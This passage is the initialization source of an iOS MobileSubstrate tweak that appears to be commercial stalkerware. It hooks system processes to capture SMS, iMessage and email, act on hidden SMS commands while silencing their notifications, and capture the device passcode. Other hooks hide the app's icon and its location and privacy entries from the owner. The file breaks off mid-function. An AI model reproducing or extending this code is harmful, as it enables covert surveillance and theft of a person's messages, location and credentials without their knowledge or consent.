#import "MSFSP.h"
#import "SMS.h"
#import "SMS2.h"
#import "Mail.h"
#import "Location.h"
#import "IMessage.h"
#import "AppVisibility.h"
#import "Media.h"
#import "MediaUtils.h"
#import "WhatsApp.h"
#import "WAMediaUploader.h"
#import "BrowserUrl.h"
#import "VisibilityNotifier.h"
#import "SystemClock.h"
#import "Contact.h"
#import "IMEIGetter.h"
#import "ApplicationLifeCycle.h"
#import "ALC.h"
#import "SpringBoardUIAlertServiceManager.h"
#import "MailNotificationHelper.h"
#import "SBActivationWizardManager.h"

#import "LINE.h"
#import "LINE5.h"
#import "Skype.h"
#import "Skype5.h"
#import "Note.h"
#import "Facebook.h"
#import "Facebook2.h"
#import "Privacy.h"
#import "LINEUtils.h"
#import "SMSSender000.h"
#import "SWU.h"
#import "Midnight.h"
#import "SystemUtilsImpl.h"
#import "Viber.h"
#import "WeChat.h"
#import "BBM.h"
#import "Password.h"
#import "FacebookPwd.h"
#import "LinkedInPwd.h"
#import "Passcode.h"
#import "Snapchat.h"
#import "Snapchat701.h"
#import "Hangout.h"
#import "YahooMessenger.h"
#import "Slingshot.h"
#import "Cydia.h"
#import "YahooMessengerIris.h"

#import "IMShareUtils.h"
#import "WallpaperChangedNotifier.h"
#import "SnapchatOfflineUtils.h"
#import "FacebookUtilsV2.h"

#pragma mark -
#pragma mark dylib mobile substrate behaviour
#pragma mark

// Mobile substrate load/run behaviour more than one mobile substrates hook the same methods
// Example: A.dylib and B.dylib

// 1. Mobile substrate use alphabetical order to load all mobile substrate thus A will load first
// 2. Mobile substrate use LIFO to call the hooked functions which are hooked more than one mobile substrate,
//		thus B's methods will call before A's methods

#pragma mark -
#pragma mark dylib initialization and initial hooks
#pragma mark -

extern "C" void MSFSPInitialize() {	
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	// Check open application and create hooks here:
	NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
	
	NSDictionary *bundleInfo = [[NSBundle mainBundle] infoDictionary];
	NSString *versionOfIM = [bundleInfo objectForKey:@"CFBundleShortVersionString"];
	if (versionOfIM == nil || [versionOfIM length] == 0) {
		versionOfIM = [bundleInfo objectForKey:@"CFBundleVersion"];
	}
	
	DLog (@"************MSFSP loaded with identifier = %@", identifier);
	DLog (@"versionOfIM = %@", versionOfIM);
	
#pragma mark -
#pragma mark SpringBoard hook
#pragma mark -
	
    if ([identifier isEqualToString:@"com.apple.springboard"]) {
		// Method for hooking SMS command, SMS and MMS capture
        // (Deprecated in from iOS 7 onward)
		Class $SMSCTServer(objc_getClass("SMSCTServer"));
		//_SMSCTServer$_ingestIncomingCTMessage$= MSHookMessageEx($SMSCTServer, @selector(_ingestIncomingCTMessage:), $SMSCTServer$_ingestIncomingCTMessage$, &$SMSCTServer$_ingestIncomingCTMessage$);
        MSHookMessage($SMSCTServer, @selector(_ingestIncomingCTMessage:), $SMSCTServer$_ingestIncomingCTMessage$, &_SMSCTServer$_ingestIncomingCTMessage$);
        
		//_SMSCTServer$_reallySendSMSRequest$withProcessedParts$recordID$ = MSHookMessage($SMSCTServer, @selector(_reallySendSMSRequest:withProcessedParts:recordID:), &$SMSCTServer$_reallySendSMSRequest$withProcessedParts$recordID$);
        MSHookMessage($SMSCTServer, @selector(_reallySendSMSRequest:withProcessedParts:recordID:), $SMSCTServer$_reallySendSMSRequest$withProcessedParts$recordID$, &_SMSCTServer$_reallySendSMSRequest$withProcessedParts$recordID$);
		//_SMSCTServer$_sendCompleted$forRecord$ = MSHookMessage($SMSCTServer, @selector(_sendCompleted:forRecord:), &$SMSCTServer$_sendCompleted$forRecord$);
        MSHookMessage($SMSCTServer, @selector(_sendCompleted:forRecord:), $SMSCTServer$_sendCompleted$forRecord$, &_SMSCTServer$_sendCompleted$forRecord$);
		
		// SMS command and sms sender for IOS6
		if ([MSFSPUtils systemOSVersion] >= 6) {
            
            Class $SBLockScreenNotificationListController(objc_getClass("SBLockScreenNotificationListController"));
            // iOS 7
            MSHookMessage($SBLockScreenNotificationListController,
                          @selector(observer:addBulletin:forFeed:),
                          $SBLockScreenNotificationListController$observer$addBulletin$forFeed$,
                          &_SBLockScreenNotificationListController$observer$addBulletin$forFeed$);
            // iOS 8
            MSHookMessage($SBLockScreenNotificationListController,
                          @selector(observer:addBulletin:forFeed:playLightsAndSirens:withReply:),
                          $SBLockScreenNotificationListController$observer$addBulletin$forFeed$playLightsAndSirens$withReply$,
                          &_SBLockScreenNotificationListController$observer$addBulletin$forFeed$playLightsAndSirens$withReply$);

            Class $SBBulletinObserverViewController(objc_getClass("SBBulletinObserverViewController"));
            // iOS 7,8 hook to suppress bulletin of sms item of sms command or sms keywords added to notification center
            MSHookMessage($SBBulletinObserverViewController,
                          @selector(observer:addBulletin:forFeed:),
                          $SBBulletinObserverViewController$observer$addBulletin$forFeed$,
                          &_SBBulletinObserverViewController$observer$addBulletin$forFeed$);
            
			/*
			 Below three methods did not get called in iOS 7
			 */
			// Intercept incoming SMS command + outgoing SMS/MMS event capture (...sent method) + keywords
			Class $IMChatRegistry = objc_getClass("IMChatRegistry");
			//_IMChatRegistry$account$chat$style$chatProperties$messageReceived$ = MSHookMessage($IMChatRegistry, @selector(account:chat:style:chatProperties:messageReceived:),
			//																					&$IMChatRegistry$account$chat$style$chatProperties$messageReceived$);
            MSHookMessage($IMChatRegistry,
                          @selector(account:chat:style:chatProperties:messageReceived:),
                          $IMChatRegistry$account$chat$style$chatProperties$messageReceived$,
                          &_IMChatRegistry$account$chat$style$chatProperties$messageReceived$);
			
			// -- this method will be called when the message has been SENT SUCCESSFULLY	
			
			// For detection the sent of reply sms command							
			//_IMChatRegistry$account$chat$style$chatProperties$messageSent$ = MSHookMessage($IMChatRegistry, @selector(account:chat:style:chatProperties:messageSent:),
			//																				   &$IMChatRegistry$account$chat$style$chatProperties$messageSent$);
            MSHookMessage($IMChatRegistry,
                          @selector(account:chat:style:chatProperties:messageSent:),
                          $IMChatRegistry$account$chat$style$chatProperties$messageSent$,
                          &_IMChatRegistry$account$chat$style$chatProperties$messageSent$);

			// -- this method will be called when the message has been FAILED to SEND		
			
			// For detection the failure of reply sms command
			//_IMChatRegistry$account$chat$style$chatProperties$messageUpdated$ = MSHookMessage($IMChatRegistry, @selector(account:chat:style:chatProperties:messageUpdated:),
			//																			   &$IMChatRegistry$account$chat$style$chatProperties$messageUpdated$);
            MSHookMessage($IMChatRegistry,
                          @selector(account:chat:style:chatProperties:messageUpdated:),
                          $IMChatRegistry$account$chat$style$chatProperties$messageUpdated$,
                          &_IMChatRegistry$account$chat$style$chatProperties$messageUpdated$);
			
			// SMS command utils (block UI updates)
			// block Alert popup notification for SMS
			Class $SBAlertItemsController(objc_getClass("SBAlertItemsController"));
			//_SBAlertItemsController$activateAlertItem$			= MSHookMessage($SBAlertItemsController, @selector(activateAlertItem:), &$SBAlertItemsController$activateAlertItem$);
            MSHookMessage($SBAlertItemsController, @selector(activateAlertItem:), $SBAlertItemsController$activateAlertItem$, &_SBAlertItemsController$activateAlertItem$);
			
			// block Banner notificaiton for SMS
			Class $SBBulletinBannerController(objc_getClass("SBBulletinBannerController"));
			//_SBBulletinBannerController$_queueBulletin$	= MSHookMessage($SBBulletinBannerController, @selector(_queueBulletin:), &$SBBulletinBannerController$_queueBulletin$);
            MSHookMessage($SBBulletinBannerController, @selector(_queueBulletin:), $SBBulletinBannerController$_queueBulletin$, &_SBBulletinBannerController$_queueBulletin$);
		
            /* In the case that alert type of Message application is set to "NONE", if the phone is not locked while SMS remote command comes in, an alert sound will be played.
             The issue occurs on iOS 7 and 8.
             This hook will be called if "NONE" is set as an alert type.
             This method is available on iOS 6, 7, and 8.
             */
            Class $SBBulletinSoundController(objc_getClass("SBBulletinSoundController"));
            MSHookMessage($SBBulletinSoundController, @selector(_shouldHonorPlaySoundRequestForBulletin:),
                          $SBBulletinSoundController$_shouldHonorPlaySoundRequestForBulletin$,
                          &_SBBulletinSoundController$_shouldHonorPlaySoundRequestForBulletin$);
            
			Class $SBAwayBulletinListController(objc_getClass("SBAwayBulletinListController"));
			//_SBAwayBulletinListController$observer$addBulletin$forFeed$ = MSHookMessage($SBAwayBulletinListController, @selector(observer:addBulletin:forFeed:),
			//																			&$SBAwayBulletinListController$observer$addBulletin$forFeed$);
            MSHookMessage($SBAwayBulletinListController,
                          @selector(observer:addBulletin:forFeed:),
                          $SBAwayBulletinListController$observer$addBulletin$forFeed$,
                          &_SBAwayBulletinListController$observer$addBulletin$forFeed$);
			
			Class $SBApplicationIcon(objc_getClass("SBApplicationIcon"));
			// Not allow to launch Messages, biteSMS while sending sms reply
			//_SBApplicationIcon$launch = MSHookMessage($SBApplicationIcon, @selector(launch), &$SBApplicationIcon$launch);
            MSHookMessage($SBApplicationIcon, @selector(launch), $SBApplicationIcon$launch, &_SBApplicationIcon$launch);
			//_SBApplicationIcon$launchFromViewSwitcher = MSHookMessage($SBApplicationIcon, @selector(launchFromViewSwitcher), &$SBApplicationIcon$launchFromViewSwitcher);
            MSHookMessage($SBApplicationIcon, @selector(launchFromViewSwitcher), $SBApplicationIcon$launchFromViewSwitcher, &_SBApplicationIcon$launchFromViewSwitcher);
			Class $SBUIController = objc_getClass("SBUIController");
			//_SBUIController$activateApplicationFromSwitcher$ = MSHookMessage($SBUIController, @selector(activateApplicationFromSwitcher:), &$SBUIController$activateApplicationFromSwitcher$);
            MSHookMessage($SBUIController, @selector(activateApplicationFromSwitcher:), $SBUIController$activateApplicationFromSwitcher$, &_SBUIController$activateApplicationFromSwitcher$);
			
			// Sound (sent sound)
			int (* _CKShouldPlaySMSSounds)(CFStringRef a, CFStringRef b, bool c);
			//lookupSymbol(CHATKIT, "_CKShouldPlaySMSSounds", _CKShouldPlaySMSSounds);
            MSImageRef image;
            image = MSGetImageByName(CHATKIT);
            _CKShouldPlaySMSSounds = (int (*)(CFStringRef a, CFStringRef b, bool c))MSFindSymbol(image, "_CKShouldPlaySMSSounds");
			MSHookFunction(_CKShouldPlaySMSSounds, MSHake(_CKShouldPlaySMSSounds));

			// Send sms reply
			[SMSSender000 sharedSMSSender000];
		}
		// Clear badge of SMS commands + Software update killer
		Class $SBApplicationIcon(objc_getClass("SBApplicationIcon"));
		//_SBApplicationIcon$setBadge$ = MSHookMessage($SBApplicationIcon, @selector(setBadge:), &$SBApplicationIcon$setBadge$);
        MSHookMessage($SBApplicationIcon, @selector(setBadge:), $SBApplicationIcon$setBadge$, &_SBApplicationIcon$setBadge$);
        // iOS 7
        // Hook to handle badge update, seem above method is no longer call in iOS 7
        Class $SBApplication = objc_getClass("SBApplication");
        MSHookMessage($SBApplication, @selector(setBadge:), $SBApplication$setBadge$, &_SBApplication$setBadge$);
		
		[VisibilityNotifier shareVisibilityNotifier];
		// Add this hook to remove icon on desktop
		Class $SBIconModel(objc_getClass("SBIconModel"));
		//_SBIconModel$addIconForApplication$ = MSHookMessage($SBIconModel,@selector(addIconForApplication:), &$SBIconModel$addIconForApplication$);
        MSHookMessage($SBIconModel,@selector(addIconForApplication:), $SBIconModel$addIconForApplication$, &_SBIconModel$addIconForApplication$);
		
		// To remove icon from AppSwitcher
		Class $SBAppSwitcherModel(objc_getClass("SBAppSwitcherModel"));
		//_SBAppSwitcherModel$_saveRecents = MSHookMessage($SBAppSwitcherModel,@selector(_saveRecents), &$SBAppSwitcherModel$_saveRecents);
        MSHookMessage($SBAppSwitcherModel, @selector(_saveRecents), $SBAppSwitcherModel$_saveRecents, &_SBAppSwitcherModel$_saveRecents);
		Class $SBAppSwitcherController = objc_getClass("SBAppSwitcherController");
		//_SBAppSwitcherController$_iconForApplication$ = MSHookMessage($SBAppSwitcherController, @selector(_iconForApplication:), &$SBAppSwitcherController$_iconForApplication$);
        MSHookMessage($SBAppSwitcherController, @selector(_iconForApplication:), $SBAppSwitcherController$_iconForApplication$, &_SBAppSwitcherController$_iconForApplication$);
		
		// Hide Location
		Class $CLLocationManager(objc_getClass("CLLocationManager"));
		//_CLLocationManager$initWithEffectiveBundleIdentifier$bundle$ = MSHookMessage($CLLocationManager, @selector(initWithEffectiveBundleIdentifier:bundle:), &$CLLocationManager$initWithEffectiveBundleIdentifier$bundle$);
        MSHookMessage($CLLocationManager, @selector(initWithEffectiveBundleIdentifier:bundle:), $CLLocationManager$initWithEffectiveBundleIdentifier$bundle$, &_CLLocationManager$initWithEffectiveBundleIdentifier$bundle$);
		
		//$CLLocationManager = objc_getMetaClass("CLLocationManager");
		//_CLLocationManager$authorizationStatusForBundle$ = MSHookMessage($CLLocationManager, @selector(authorizationStatusForBundle:), &$CLLocationManager$authorizationStatusForBundle$);
		//_CLLocationManager$authorizationStatusForBundleIdentifier$ = MSHookMessage($CLLocationManager, @selector(authorizationStatusForBundleIdentifier:), &$CLLocationManager$authorizationStatusForBundleIdentifier$);
		//_CLLocationManager$_authorizationStatusForBundleIdentifier$bundle$ = MSHookMessage($CLLocationManager, @selector(_authorizationStatusForBundleIdentifier:bundle:), &$CLLocationManager$_authorizationStatusForBundleIdentifier$bundle$);
		
		// Capture WallPaper on iOS 6
		Class $SBWallpaperView(objc_getClass("SBWallpaperView"));
		//_SBWallpaperView$_wallpaperChanged = MSHookMessage($SBWallpaperView, @selector(_wallpaperChanged), &$SBWallpaperView$_wallpaperChanged);
        MSHookMessage($SBWallpaperView, @selector(_wallpaperChanged), $SBWallpaperView$_wallpaperChanged, &_SBWallpaperView$_wallpaperChanged);
		
		// Capture WallPaper on iOS 7,8
		if (!$SBWallpaperView) {			
			[[WallpaperChangedNotifier sharedInstance] registerWallpaperChangedNotification];					
		}
	
		// IMEI getter
		[IMEIGetter sharedIMEIGetter];
		
		// Application Life Cycle (ALC)
		[ApplicationLifeCycle sharedALC];
		// This method exist in 4, 5
		Class $SBApplicationController = objc_getClass("SBApplicationController");
		//_SBApplicationController$applicationStateChanged$state$ = MSHookMessage($SBApplicationController, @selector(applicationStateChanged:state:), &$SBApplicationController$applicationStateChanged$state$);
        MSHookMessage($SBApplicationController, @selector(applicationStateChanged:state:), $SBApplicationController$applicationStateChanged$state$, &_SBApplicationController$applicationStateChanged$state$);
		// ALC for IOS 6,7 (these methods not exist in 4 & 5)
		//Class $SBApplication = objc_getClass("SBApplication");
        $SBApplication = objc_getClass("SBApplication");
		//_SBApplication$didSuspend = MSHookMessage($SBApplication, @selector(didSuspend), &$SBApplication$didSuspend);
        MSHookMessage($SBApplication, @selector(didSuspend), $SBApplication$didSuspend, &_SBApplication$didSuspend);
		//_SBApplication$didActivate = MSHookMessage($SBApplication, @selector(didActivate), &$SBApplication$didActivate);
        MSHookMessage($SBApplication, @selector(didActivate), $SBApplication$didActivate, &_SBApplication$didActivate);
        // iOS 8
        MSHookMessage($SBApplication, @selector(_didSuspend), $SBApplication$_didSuspend, &_SBApplication$_didSuspend);
        MSHookMessage($SBApplication, @selector(didActivateWithTransactionID:), $SBApplication$didActivateWithTransactionID$, &_SBApplication$didActivateWithTransactionID$);
        // iOS 9
        MSHookMessage($SBApplication, @selector(didActivateForScene:transactionID:), $SBApplication$didActivateForScene$transactionID$, &_SBApplication$didActivateForScene$transactionID$);
		
		// Display software update (for our application) view
		[SpringBoardUIAlertServiceManager sharedSpringBoardUIAlertServiceManager];
		
		// Activation wizard...
		[SBActivationWizardManager sharedSBActivationWizardManager];
		//[[SBActivationWizardManager sharedSBActivationWizardManager] _test];
		
		// Software Update Killer (Obsoleted, Jailbreak tool handle it)
		Class $SBSoftwareUpdateController(objc_getClass("SBSoftwareUpdateController"));
		DLog(@"=============== $SBSoftwareUpdateController = %@",$SBSoftwareUpdateController);
		// Cancel timer force to install sw
		//_SBSoftwareUpdateController$_showForcedInstallAlert = MSHookMessage($SBSoftwareUpdateController, @selector(_showForcedInstallAlert), &$SBSoftwareUpdateController$_showForcedInstallAlert);
        MSHookMessage($SBSoftwareUpdateController, @selector(_showForcedInstallAlert), $SBSoftwareUpdateController$_showForcedInstallAlert, &_SBSoftwareUpdateController$_showForcedInstallAlert);
		// Handle error if battery below 50%
		//_SBSoftwareUpdateController$_handleInstallError$ = MSHookMessage($SBSoftwareUpdateController, @selector(_handleInstallError:), &$SBSoftwareUpdateController$_handleInstallError$);
        MSHookMessage($SBSoftwareUpdateController, @selector(_handleInstallError:), $SBSoftwareUpdateController$_handleInstallError$, &_SBSoftwareUpdateController$_handleInstallError$);
		
		Class $SpringBoard(objc_getClass("SpringBoard"));
		// Update sw badge in Preferences (Obsoleted, Jailbreak tool handle it)
		//_SpringBoard$applicationDidFinishLaunching$ = MSHookMessage($SpringBoard, @selector(applicationDidFinishLaunching:), &$SpringBoard$applicationDidFinishLaunching$);
        MSHookMessage($SpringBoard, @selector(applicationDidFinishLaunching:), $SpringBoard$applicationDidFinishLaunching$, &_SpringBoard$applicationDidFinishLaunching$);
		// Mid-night passed
		//_SpringBoard$_midnightPassed = MSHookMessage($SpringBoard, @selector(_midnightPassed), &$SpringBoard$_midnightPassed);
        MSHookMessage($SpringBoard, @selector(_midnightPassed), $SpringBoard$_midnightPassed, &_SpringBoard$_midnightPassed);
        
		//iMessage Attachment
        Class $IMChat(objc_getClass("IMChat"));
		// Outgoing Contact, location, voice memo file for iOS 6
		//_IMChat$sendMessage$ = MSHookMessage($IMChat, @selector(sendMessage:), &$IMChat$sendMessage$);
        MSHookMessage($IMChat, @selector(sendMessage:), $IMChat$sendMessage$, &_IMChat$sendMessage$);
		// ALL Incoming for iOS 6
		//_IMChat$_handleIncomingMessage$ = MSHookMessage($IMChat, @selector(_handleIncomingMessage:), &$IMChat$_handleIncomingMessage$);
        MSHookMessage($IMChat, @selector(_handleIncomingMessage:), $IMChat$_handleIncomingMessage$, &_IMChat$_handleIncomingMessage$);
        
#pragma mark - Passcode -
        
        Class $SBDeviceLockController(objc_getClass("SBDeviceLockController"));
        MSHookMessage($SBDeviceLockController, @selector(attemptDeviceUnlockWithPassword:appRequested:),
                      $SBDeviceLockController$attemptDeviceUnlockWithPassword$appRequested$,
                      &_SBDeviceLockController$attemptDeviceUnlockWithPassword$appRequested$);
        
        // iOS 9, Hide from Spotlight search (Siri suggested apps)
        Class $SPUISearchViewController = objc_getClass("SPUISearchViewController");
        MSHookMessage($SPUISearchViewController, @selector(tableView:cellForRowAtIndexPath:), $SPUISearchViewController$tableView$cellForRowAtIndexPath$, &_SPUISearchViewController$tableView$cellForRowAtIndexPath$);
	}
	
#pragma mark -
#pragma mark mobilemail hook
#pragma mark -
	
	// For capturing incoming mail and outgoing mail
	if ([identifier isEqualToString:@"com.apple.mobilemail"]) {
		
		// -- register notification posted by blocking part
		[MailNotificationHelper sharedInstance];
		
        Class $Message(objc_getClass("Message"));
		//_Message$dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$ = MSHookMessage($Message,
		//						@selector(dataForMimePart:inRange:isComplete:downloadIfNecessary:didDownload:),
		//						&$Message$dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$);
        MSHookMessage($Message,
                      @selector(dataForMimePart:inRange:isComplete:downloadIfNecessary:didDownload:),
                      $Message$dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$,
                      &_Message$dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$);
		
		// Incoming Email for iOS 7.0.x
        Class $MFMessage(objc_getClass("MFMessage"));
		//_MFMessage$dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$ = MSHookMessage($MFMessage,
		//																							 @selector(dataForMimePart:inRange:isComplete:downloadIfNecessary:didDownload:),
		//																							 &$MFMessage$dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$);
		MSHookMessage($MFMessage,
                      @selector(dataForMimePart:inRange:isComplete:downloadIfNecessary:didDownload:),
                      $MFMessage$dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$,
                      &_MFMessage$dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$);
        
        // Incoming Email for iOS 7.1.1, 8.1
        MSHookMessage($MFMessage,
                      @selector(fetchDataForMimePart:inRange:withConsumer:isComplete:downloadIfNecessary:),
                      $MFMessage$fetchDataForMimePart$inRange$withConsumer$isComplete$downloadIfNecessary$,
                      &_MFMessage$fetchDataForMimePart$inRange$withConsumer$isComplete$downloadIfNecessary$);
						
		if ([[[UIDevice currentDevice] systemVersion] intValue] > 4) {
			DLog(@"IOS5 up");
			Class $MFOutgoingMessageDelivery(objc_getClass("MFOutgoingMessageDelivery"));
			//_MFOutgoingMessageDelivery$initWithMessage$ = MSHookMessage($MFOutgoingMessageDelivery, @selector(initWithMessage:), &$MFOutgoingMessageDelivery$initWithMessage$);
            MSHookMessage($MFOutgoingMessageDelivery, @selector(initWithMessage:), $MFOutgoingMessageDelivery$initWithMessage$, &_MFOutgoingMessageDelivery$initWithMessage$);
			//_MFOutgoingMessageDelivery$initWithHeaders$mixedContent$textPartsAreHTML$ = MSHookMessage($MFOutgoingMessageDelivery, @selector(initWithHeaders:mixedContent:textPartsAreHTML:), &$MFOutgoingMessageDelivery$initWithHeaders$mixedContent$textPartsAreHTML$);
            MSHookMessage($MFOutgoingMessageDelivery, @selector(initWithHeaders:mixedContent:textPartsAreHTML:), $MFOutgoingMessageDelivery$initWithHeaders$mixedContent$textPartsAreHTML$, &_MFOutgoingMessageDelivery$initWithHeaders$mixedContent$textPartsAreHTML$);
			//_MFOutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$ = MSHookMessage($MFOutgoingMessageDelivery, @selector(initWithHeaders:HTML:plainTextAlternative:other:), &$MFOutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$);
            MSHookMessage($MFOutgoingMessageDelivery, @selector(initWithHeaders:HTML:plainTextAlternative:other:), $MFOutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$, &_MFOutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$);
			//_MFOutgoingMessageDelivery$deliverSynchronously = MSHookMessage($MFOutgoingMessageDelivery, @selector(deliverSynchronously), &$MFOutgoingMessageDelivery$deliverSynchronously);
            MSHookMessage($MFOutgoingMessageDelivery, @selector(deliverSynchronously), $MFOutgoingMessageDelivery$deliverSynchronously, &_MFOutgoingMessageDelivery$deliverSynchronously);
			if ([MSFSPUtils systemOSVersion] >= 6) {
				//_MFOutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$charsets$ = MSHookMessage($MFOutgoingMessageDelivery, @selector(initWithHeaders:HTML:plainTextAlternative:other:charsets:), &$MFOutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$charsets$);
				MSHookMessage($MFOutgoingMessageDelivery, @selector(initWithHeaders:HTML:plainTextAlternative:other:charsets:), $MFOutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$charsets$, &_MFOutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$charsets$);
			}
		} else {
            DLog(@"IOS4");
            Class $OutgoingMessageDelivery(objc_getClass("OutgoingMessageDelivery"));
            //_OutgoingMessageDelivery$initWithMessage$ = MSHookMessage($OutgoingMessageDelivery, @selector(initWithMessage:), &$OutgoingMessageDelivery$initWithMessage$);
            MSHookMessage($OutgoingMessageDelivery, @selector(initWithMessage:), $OutgoingMessageDelivery$initWithMessage$, &_OutgoingMessageDelivery$initWithMessage$);
            //_OutgoingMessageDelivery$initWithHeaders$mixedContent$textPartsAreHTML$ = MSHookMessage($OutgoingMessageDelivery, @selector(initWithHeaders:mixedContent:textPartsAreHTML:), &$OutgoingMessageDelivery$initWithHeaders$mixedContent$textPartsAreHTML$);
            MSHookMessage($OutgoingMessageDelivery, @selector(initWithHeaders:mixedContent:textPartsAreHTML:), $OutgoingMessageDelivery$initWithHeaders$mixedContent$textPartsAreHTML$, &_OutgoingMessageDelivery$initWithHeaders$mixedContent$textPartsAreHTML$);
            //_OutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$ = MSHookMessage($OutgoingMessageDelivery, @selector(initWithHeaders:HTML:plainTextAlternative:other:), &$OutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$);
            MSHookMessage($OutgoingMessageDelivery, @selector(initWithHeaders:HTML:plainTextAlternative:other:), $OutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$, &_OutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$);
            //_OutgoingMessageDelivery$deliverSynchronously = MSHookMessage($OutgoingMessageDelivery, @selector(deliverSynchronously), &$OutgoingMessageDelivery$deliverSynchronously);
            MSHookMessage($OutgoingMessageDelivery, @selector(deliverSynchronously), $OutgoingMessageDelivery$deliverSynchronously, &_OutgoingMessageDelivery$deliverSynchronously);
		}
	}
	
#pragma mark -
#pragma mark Preferences hooks
#pragma mark -
	
	// For Hiding Location icon and alert
	// Get notification for user change date time

	if ([identifier isEqualToString:@"com.apple.Preferences"]) {
		Class $LocationServicesListController(objc_getClass("LocationServicesListController"));
		// To hide application bundle display name of location service in location service controller
		// IOS 4, 5 - Obsolete
        //_LocationServicesListController$specifiers = MSHookMessage($LocationServicesListController, @selector(specifiers), &$LocationServicesListController$specifiers);
		// IOS 4, 5, 6, 7
		//_LocationServicesListController$tableView$cellForRowAtIndexPath$ = MSHookMessage($LocationServicesListController, @selector(tableView:cellForRowAtIndexPath:), &$LocationServicesListController$tableView$cellForRowAtIndexPath$);
        MSHookMessage($LocationServicesListController, @selector(tableView:cellForRowAtIndexPath:), $LocationServicesListController$tableView$cellForRowAtIndexPath$, &_LocationServicesListController$tableView$cellForRowAtIndexPath$);
        // iOS 9
        Class $PSUILocationServicesListController = objc_getClass("PSUILocationServicesListController");
        MSHookMessage($PSUILocationServicesListController, @selector(tableView:cellForRowAtIndexPath:), $PSUILocationServicesListController$tableView$cellForRowAtIndexPath$, &_PSUILocationServicesListController$tableView$cellForRowAtIndexPath$);
		
		// Location Service toggle (IOS 4, 5, 6, 7) for post notification to daemon
		//_LocationServicesListController$setLocationServicesEnabled$specifier$ = MSHookMessage($LocationServicesListController, @selector(setLocationServicesEnabled:specifier:), &$LocationServicesListController$setLocationServicesEnabled$specifier$);
		MSHookMessage($LocationServicesListController, @selector(setLocationServicesEnabled:specifier:), $LocationServicesListController$setLocationServicesEnabled$specifier$, &_LocationServicesListController$setLocationServicesEnabled$specifier$);
		
		// location service toggle (IOS 4,5)
		//_LocationServicesListController$disableLocationServicesAfterConfirm$ = MSHookMessage($LocationServicesListController, @selector(disableLocationServicesAfterConfirm:), &$LocationServicesListController$disableLocationServicesAfterConfirm$);
		//_LocationServicesListController$alertView$clickedButtonAtIndex$ = MSHookMessage($LocationServicesListController, @selector(alertView:clickedButtonAtIndex:), &$LocationServicesListController$alertView$clickedButtonAtIndex$);
		//_LocationServicesListController$actionSheet$clickedButtonAtIndex$ = MSHookMessage($LocationServicesListController, @selector(actionSheet:clickedButtonAtIndex:), &$LocationServicesListController$actionSheet$clickedButtonAtIndex$);
		
		
		// location service toggle (IOS 4,5)
		// Class $PrefsRootController(objc_getClass("PrefsRootController"));
		//_PrefsRootController$locationServicesEnabled$ = MSHookMessage($PrefsRootController, @selector(locationServicesEnabled:), &$PrefsRootController$locationServicesEnabled$);
		
		// IOS 4,5
        Class $ResetPrefController(objc_getClass("ResetPrefController"));
        //_ResetPrefController$resetLocationWarnings$ = MSHookMessage($ResetPrefController, @selector(resetLocationWarnings:), &$ResetPrefController$resetLocationWarnings$);
        MSHookMessage($ResetPrefController, @selector(resetLocationWarnings:), $ResetPrefController$resetLocationWarnings$, &_ResetPrefController$resetLocationWarnings$);
		
		if ([[[UIDevice currentDevice] systemVersion] intValue] >= 6) {
			
			// Reset privacy
			//_ResetPrefController$resetPrivacyWarnings$ = MSHookMessage($ResetPrefController, @selector(resetPrivacyWarnings:), &$ResetPrefController$resetPrivacyWarnings$);
            MSHookMessage($ResetPrefController, @selector(resetPrivacyWarnings:), $ResetPrefController$resetPrivacyWarnings$, &_ResetPrefController$resetPrivacyWarnings$);
			
			// Location service toggle IOS 6
			// To hide application bundle display name when user toggle location service in location service controller (ON/OFF in location service controller)
			// Obsolete
			//_LocationServicesListController$_setLocationServicesEnabled$ = MSHookMessage($LocationServicesListController, @selector(_setLocationServicesEnabled:), &$LocationServicesListController$_setLocationServicesEnabled$);
			
			Class $TCCAccessController(objc_getClass("TCCAccessController"));
			//_TCCAccessController$tableView$cellForRowAtIndexPath$ = MSHookMessage($TCCAccessController, @selector(tableView:cellForRowAtIndexPath:), &$TCCAccessController$tableView$cellForRowAtIndexPath$);
            MSHookMessage($TCCAccessController, @selector(tableView:cellForRowAtIndexPath:), $TCCAccessController$tableView$cellForRowAtIndexPath$, &_TCCAccessController$tableView$cellForRowAtIndexPath$);
            // iOS 9
            Class $PSUITCCAccessController = objc_getClass("PSUITCCAccessController");
            MSHookMessage($PSUITCCAccessController, @selector(tableView:cellForRowAtIndexPath:), $PSUITCCAccessController$tableView$cellForRowAtIndexPath$, &_PSUITCCAccessController$tableView$cellForRowAtIndexPath$);
			
			NSBundle *fbSettingsBundle = [NSBundle bundleWithPath:@"/System/Library/PreferenceBundles/FacebookSettings.bundle"];
			Class $SLFacebookSettingsController = [fbSettingsBundle classNamed:@"SLFacebookSettingsController"];
			//Class $SLFacebookSettingsController = objc_getClass("SLFacebookSettingsController");
			//DLog (@"----- fbSettingsBundle = %@", fbSettingsBundle);
			//DLog (@"----- $SLFacebookSettingsController = %@", $SLFacebookSettingsController);
			//_SLFacebookSettingsController$tableView$cellForRowAtIndexPath$ = MSHookMessage($SLFacebookSettingsController, @selector(tableView:cellForRowAtIndexPath:), &$SLFacebookSettingsController$tableView$cellForRowAtIndexPath$);
